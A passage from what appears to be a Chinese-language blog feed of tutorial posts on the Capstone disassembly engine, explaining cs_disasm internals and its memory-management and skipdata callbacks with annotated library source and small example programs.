insn_size;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 遇到中断指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为detail指针释放内存</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;skipdata || handle-&gt;skipdata_size &gt; size)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_setup.callback) &#123;</span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_setup.callback(buffer_org, size_org,</span><br><span class="line">(<span class="keyword">size_t</span>)(offset - offset_org), handle-&gt;skipdata_setup.user_data);</span><br><span class="line"><span class="keyword">if</span> (skipdata_bytes &gt; size)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skipdata_bytes)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_size;</span><br><span class="line"></span><br><span class="line">insn_cache-&gt;id = <span class="number">0</span>;</span><br><span class="line">insn_cache-&gt;address = offset;</span><br><span class="line">insn_cache-&gt;size = (<span class="keyword">uint16_t</span>)skipdata_bytes;</span><br><span class="line"><span class="built_in">memcpy</span>(insn_cache-&gt;bytes, buffer, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">insn_cache-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">insn_cache-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="built_in">strncpy</span>(insn_cache-&gt;mnemonic, handle-&gt;skipdata_setup.mnemonic,</span><br><span class="line"><span class="keyword">sizeof</span>(insn_cache-&gt;mnemonic) - <span class="number">1</span>);</span><br><span class="line">skipdata_opstr(insn_cache-&gt;op_str, buffer, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">insn_cache-&gt;detail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">next_offset = skipdata_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一条新指令进入缓存</span></span><br><span class="line">f++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反汇编了一条指令</span></span><br><span class="line">c++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; c == count)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f == cache_size) &#123;</span><br><span class="line">cache_size = cache_size * <span class="number">8</span> / <span class="number">5</span>; </span><br><span class="line">total_size += (<span class="keyword">sizeof</span>(cs_insn) * cache_size);</span><br><span class="line">tmp = cs_mem_realloc(total, total_size);</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;<span class="comment">//内存不足</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">insn_cache = (cs_insn *)total;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; c; i++, insn_cache++)</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">*insn = <span class="literal">NULL</span>;</span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total = tmp;</span><br><span class="line"><span class="comment">//在最后一条指令之后继续填充缓存</span></span><br><span class="line">insn_cache = (cs_insn *)((<span class="keyword">char</span> *)total + <span class="keyword">sizeof</span>(cs_insn) * c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将f重置为0，从一开始就填入缓存</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">insn_cache++;</span><br><span class="line"></span><br><span class="line">buffer += next_offset;</span><br><span class="line">size -= next_offset;</span><br><span class="line">offset += next_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!c) &#123;</span><br><span class="line"><span class="comment">//未反汇编任何指令</span></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">total = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (f != cache_size) &#123;</span><br><span class="line"><span class="comment">// 没有完全使用最后一个缓存，缩小大小</span></span><br><span class="line">tmp = cs_mem_realloc(total, total_size - (cache_size - f) * <span class="keyword">sizeof</span>(*insn_cache));</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;<span class="comment">// 内存不足</span></span><br><span class="line"><span class="comment">// 释放所有detail指针</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">insn_cache = (cs_insn *)total;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; c; i++, insn_cache++)</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">*insn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*insn = total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例，x86_64:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);   <span class="comment">//所有指令，基址0x1000，放入insn</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出</p><p><a href="https://i.loli.net/2019/07/22/5d35c5087d17d31194.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/22/5d35c5087d17d31194.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-三&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-三&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(二)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/</id>
    <published>2019-07-26T16:00:00.000Z</published>
    <updated>2020-03-16T04:39:06.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-二"><a href="#Capstone反汇编引擎数据类型及API分析及示例-二" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(二)"></a>Capstone反汇编引擎数据类型及API分析及示例(二)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5761" target="_blank" rel="noopener">https://xz.aliyun.com/t/5761</a></p></blockquote><p>上篇分析了Capstone开放的数据类型，下面就来正式看看API吧<br>官方开放的API只有二十个左右，但为了能写的更易懂，我将结合实例，分多篇写。<br>API中作者将capstone缩写为cs，下面我也用这种方式描述</p><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-malloc-t"><a href="#cs-malloc-t" class="headerlink" title="cs_malloc_t"></a>cs_malloc_t</h3><p><code>void* (CAPSTONE_API *cs_malloc_t)(size_t size);</code></p><p>cs的动态内存分配，用于</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure></div><p>cs_malloc_t定义于capstone.lib和capstone.dll的cs.c中，<br><a href="https://i.loli.net/2019/07/21/5d33f804831d248926.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d33f804831d248926.jpg" class="lazyload"></a></p><blockquote><p>在用户模式下，cs_mem_malloc默认使用系统malloc</p></blockquote><blockquote><p>Windows driver模式下，<code>cs_malloc_t cs_mem_malloc = cs_winkernel_malloc;</code><br>cs_winkernel_malloc定义于\capstone-4.0.1\windows\winkernel_mm.c,</p></blockquote><p>实现代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 长度不能分配为0</span></span><br><span class="line">NT_ASSERT(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FP; NonPagedPool用于支持 Windows 7 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> prefast(suppress : 30030)<span class="comment">// 分配可执行的POOL_TYPE内存</span></span></span><br><span class="line"><span class="keyword">size_t</span> number_of_bytes = <span class="number">0</span>;</span><br><span class="line">CS_WINKERNEL_MEMBLOCK *block = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 特定的值能造成溢出</span></span><br><span class="line"><span class="comment">// 如果value中的和超出或低于类型容量，函数将返回NULL。</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(RtlSizeTAdd(size, <span class="keyword">sizeof</span>(CS_WINKERNEL_MEMBLOCK), &amp;number_of_bytes))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">block = (CS_WINKERNEL_MEMBLOCK *)ExAllocatePoolWithTag(</span><br><span class="line">NonPagedPool, number_of_bytes, CS_WINKERNEL_POOL_TAG);</span><br><span class="line"><span class="keyword">if</span> (!block) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">block-&gt;size = size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> block-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>OSX kernel模式下，<code>cs_malloc_t cs_mem_malloc = kern_os_malloc;</code>，这里暂且不探讨。</p></blockquote><h3 id="cs-calloc-t"><a href="#cs-calloc-t" class="headerlink" title="cs_calloc_t"></a>cs_calloc_t</h3><p><code>void* (CAPSTONE_API *cs_calloc_t)(size_t nmemb, size_t size);</code></p><p>cs申请内存并初始化<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_calloc_t cs_mem_calloc = calloc;</code>,使用系统calloc<br>Windows driver模式： <code>cs_calloc_t cs_mem_calloc = cs_winkernel_calloc;</code><br>实现代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_calloc</span><span class="params">(<span class="keyword">size_t</span> n, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> total = n * size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *new_ptr = cs_winkernel_malloc(total);</span><br><span class="line"><span class="keyword">if</span> (!new_ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RtlFillMemory(new_ptr, total, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>OSX kernel模式： <code>cs_calloc_t cs_mem_calloc = cs_kern_os_calloc;</code><br><a href="https://i.loli.net/2019/07/21/5d340703367d259403.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d340703367d259403.jpg" class="lazyload"></a><br>直接调用kern_os_malloc了</p><h3 id="cs-realloc-t"><a href="#cs-realloc-t" class="headerlink" title="cs_realloc_t"></a>cs_realloc_t</h3><p><code>void* (CAPSTONE_API *cs_realloc_t)(void *ptr, size_t size);</code></p><p>cs重新分配内存<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_realloc_t cs_mem_realloc = realloc;</code>,调用系统realloc<br>Windows driver模式： <code>cs_realloc_t cs_mem_realloc = cs_winkernel_realloc;</code></p><p>实现代码，可以看出是利用cs_winkernel_malloc重新申请</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> smaller_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> cs_winkernel_malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_ptr = cs_winkernel_malloc(size);</span><br><span class="line"><span class="keyword">if</span> (!new_ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">current_size = CONTAINING_RECORD(ptr, CS_WINKERNEL_MEMBLOCK, data)-&gt;size;</span><br><span class="line">smaller_size = (current_size &lt; size) ? current_size : size;</span><br><span class="line">RtlCopyMemory(new_ptr, ptr, smaller_size);</span><br><span class="line">cs_winkernel_free(ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> new_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>OSX kernel模式： <code>cs_realloc_t cs_mem_realloc = kern_os_realloc;</code></p><h3 id="cs-free-t"><a href="#cs-free-t" class="headerlink" title="cs_free_t"></a>cs_free_t</h3><p><code>typedef void (CAPSTONE_API *cs_free_t)(void *ptr);</code></p><p>cs释放内存<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_free_t cs_mem_free = free;</code>,调用系统free<br>Windows driver模式： <code>cs_free_t cs_mem_free = cs_winkernel_free;</code></p><p>实现代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> CAPSTONE_API <span class="title">cs_winkernel_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">ExFreePoolWithTag(CONTAINING_RECORD(ptr, CS_WINKERNEL_MEMBLOCK, data), CS_WINKERNEL_POOL_TAG);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>OSX kernel模式：  <code>cs_free_t cs_mem_free = kern_os_free;</code></p><h3 id="cs-vsnprintf-t"><a href="#cs-vsnprintf-t" class="headerlink" title="cs_vsnprintf_t"></a>cs_vsnprintf_t</h3><p><code>int (CAPSTONE_API *cs_vsnprintf_t)(char *str, size_t size, const char *format, va_list ap);</code></p><p>按size大小输出到字符串str中</p><p>用户模式：<br><a href="https://i.loli.net/2019/07/21/5d340c613ba1e61273.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d340c613ba1e61273.jpg" class="lazyload"></a><br>值得注意的是，如果系统为wince，将使用_vsnprintf函数<br>vsnprintf ()和_vsnprintf()对于驱动程序都是可用的，但是它们有一些不同。<br>在需要返回值和设置空终止符时应使用vsnprintf()</p><p>vsnprintf定义在stdio.h<br><a href="https://i.loli.net/2019/07/21/5d340d423babc62961.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d340d423babc62961.jpg" class="lazyload"></a></p><p>Windows driver模式： <code>cs_vsnprintf_t cs_vsnprintf = cs_winkernel_vsnprintf;</code></p><p>代码实现</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_winkernel_vsnprintf</span><span class="params">(<span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> count, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list argptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = _vsnprintf(buffer, count, format, argptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// _vsnprintf()在字符串被截断时返回-1，在整个字符串被存储但“buffer”末尾没有“\0”时返回“count”。在这两种情况下，都需要手动添加空终止符。</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">-1</span> || (<span class="keyword">size_t</span>)result == count) &#123;</span><br><span class="line">buffer[count - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="comment">// 在返回-1时，函数必须获取并返回一些本来要写入的字符。因此，通过重试使用temp buffer进行相同的转换，这个缓冲区就可能足够大来完成格式化，并且获得很多本应写入的字符。</span></span><br><span class="line"><span class="keyword">char</span>* tmp = cs_winkernel_malloc(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">if</span> (!tmp) &#123;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result = _vsnprintf(tmp, <span class="number">0x1000</span>, format, argptr);</span><br><span class="line">NT_ASSERT(result != <span class="number">-1</span>);</span><br><span class="line">cs_winkernel_free(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>OSX kernel模式： <code>cs_vsnprintf_t cs_vsnprintf = vsnprintf;</code>，使用默认vsnprintf</p><h3 id="cs-skipdata-cb-t"><a href="#cs-skipdata-cb-t" class="headerlink" title="cs_skipdata_cb_t"></a>cs_skipdata_cb_t</h3><p>size_t (CAPSTONE_API *cs_skipdata_cb_t)(const uint8_t *code, size_t code_size, size_t offset, void *user_data);</p><p>SKIPDATA选项的用户自定义回调函数。</p><p>code:包含要分解的代码的输入缓冲区。和传递给cs_disasm()的缓冲区相同。<br>code_size:上面的code缓冲区的大小(以字节为单位)。<br>offset:上面提到的输入缓冲区code中当前检查字节的位置。<br>user_data:用户数据通过cs_opt_skipdata结构中的@user_data字段传递给cs_option()。<br>return:返回要跳过的字节数，或者0表示立即停止反汇编。</p><p>cs_skipdata_cb_t在<code>struct cs_opt_skipdata</code>中调用，下面来看一个例子<br>分析写在注释中</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">cs_opt_type opt_skipdata;</span><br><span class="line"><span class="keyword">size_t</span> skipdata;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span>  <span class="comment">//输出机器码</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00\x00\x91\x92"</span>  <span class="comment">//测试用机器码</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RANDOM_CODE <span class="meta-string">"\xed\x00\x00\x00\x00\x1a\x5a\x0f\x1f\xff\xc2\x09\x80\x00\x00\x00\x07\xf7\xeb\x2a\xff\xff\x7f\x57\xe3\x01\xff\xff\x7f\x57\xeb\x00\xf0\x00\x00\x24\xb2\x4f\x00\x78"</span></span></span><br><span class="line"></span><br><span class="line">cs_opt_skipdata skipdata = &#123;</span><br><span class="line"><span class="comment">// 把默认 "data" 描述符从 ".byte" 重命名为 "db"</span></span><br><span class="line"><span class="string">"db"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[2] = &#123;</span>         <span class="comment">//以默认描述符和自定义描述符两种方式建立一个数组</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax) - Skip data"</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax) - Skip data with custom mnemonic"</span>,</span><br><span class="line">CS_OPT_INVALID,</span><br><span class="line">CS_OPT_OFF,</span><br><span class="line">CS_OPT_SKIPDATA_SETUP,</span><br><span class="line">(<span class="keyword">size_t</span>)&amp; skipdata,</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;   <span class="comment">//建立capstone句柄</span></span><br><span class="line"><span class="keyword">uint64_t</span> address = <span class="number">0x1000</span>;  <span class="comment">//设置起始地址</span></span><br><span class="line">cs_insn* insn;  <span class="comment">//具体信息结构体</span></span><br><span class="line">cs_err err;  <span class="comment">//错误枚举</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">size_t</span> count;  <span class="comment">//成功反汇编行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span 